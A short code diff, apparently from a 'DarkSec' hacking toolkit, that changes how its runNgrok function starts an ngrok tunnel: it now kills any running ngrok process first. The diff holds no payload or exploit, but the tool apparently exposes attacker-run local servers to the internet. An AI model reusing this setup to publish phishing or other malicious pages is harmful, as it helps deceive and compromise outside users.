@@ -401,7 +401,7 @@ def runNgrok(port):
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
 
-    system('./Server/ngrok http {} > /dev/null &'.format(port))
+    system('killall -2 ngrok > /dev/null 2>&1 && ./Server/ngrok http {} > /dev/null &'.format(port))
     while True:
         sleep(2)
         system(
